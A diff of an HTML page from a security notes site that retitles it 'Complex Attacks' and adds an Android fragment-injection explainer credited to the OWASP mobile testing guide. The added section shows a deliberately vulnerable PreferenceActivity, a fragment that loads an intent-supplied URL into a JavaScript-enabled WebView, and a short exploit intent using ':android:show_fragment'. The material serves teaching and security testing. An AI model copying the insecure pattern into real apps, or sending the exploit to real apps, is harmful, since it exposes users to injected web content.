@@ -4,7 +4,7 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
-  <title>Plan for Reverse Engineering - Observer</title>
+  <title>Complex Attacks - Observer</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   
   <link rel="icon" href="https://bakerst221b.com/favicon.png">
@@ -150,7 +150,7 @@
   <h4>Docs</h4>
   <ul>
     
-    <li class="">
+    <li class="active ">
       <a href="https://bakerst221b.com/docs/articles/mobile/android/complex-attacks/">Complex Attacks</a>
     </li>
     
@@ -186,7 +186,7 @@
       <a href="https://bakerst221b.com/docs/articles/forensics/memory/plan/">Plan for Memory Forensics</a>
     </li>
     
-    <li class="active ">
+    <li class="">
       <a href="https://bakerst221b.com/docs/articles/forensics/reveng/plan/">Plan for Reverse Engineering</a>
     </li>
     
@@ -265,9 +265,37 @@
         </div>
         <div class="col-12 col-md-9">
           
-<h1 class="title">Plan for Reverse Engineering</h1>
+<h1 class="title">Complex Attacks</h1>
 <div class="content ">
-  <h1 id="plan-for-reverse-engineering">Plan for Reverse Engineering</h1>
+  <h2 id="fragment-injection">Fragment Injection</h2>
+<p>The basic idea behind the scenes:</p>
+<p>Vulnerable application&rsquo;s Activity with <code>extends PreferenceActivity</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">PreferenceActivity</span> <span class="o">{</span>
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Vulnerable application&rsquo;s Fragment without protection:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyFragment</span> <span class="kd">extends</span> <span class="n">Fragment</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span> <span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="n">View</span> <span class="nf">onCreateView</span><span class="o">(</span><span class="n">LayoutInflater</span> <span class="n">inflater</span><span class="o">,</span> <span class="n">ViewGroup</span> <span class="n">container</span><span class="o">,</span> <span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">View</span> <span class="n">v</span> <span class="o">=</span> <span class="n">inflater</span><span class="o">.</span><span class="na">inflate</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">fragmentLayout</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+        <span class="n">WebView</span> <span class="n">myWebView</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebView</span><span class="o">)</span> <span class="n">wv</span><span class="o">.</span><span class="na">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">webview</span><span class="o">);</span>
+        <span class="n">myWebView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">myWebView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getActivity</span><span class="o">().</span><span class="na">getIntent</span><span class="o">().</span><span class="na">getDataString</span><span class="o">());</span>
+        <span class="k">return</span> <span class="n">v</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Expoit:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
+<span class="n">i</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_CLEAR_TASK</span><span class="o">);</span>
+<span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">&#34;pt.claudio.insecurefragment&#34;</span><span class="o">,</span><span class="s">&#34;pt.claudio.insecurefragment.MainActivity&#34;</span><span class="o">);</span>
+<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;:android:show_fragment&#34;</span><span class="o">,</span><span class="s">&#34;pt.claudio.insecurefragment.MyFragment&#34;</span><span class="o">);</span>
+<span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">&#34;https://security.claudio.pt&#34;</span><span class="o">));</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+</code></pre></div><p>All code is from <a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05h-testing-platform-interaction#testing-for-fragment-injection-mstg-platform-2">Mobile SecGuide</a>.</p>
 
 </div>
 </div>
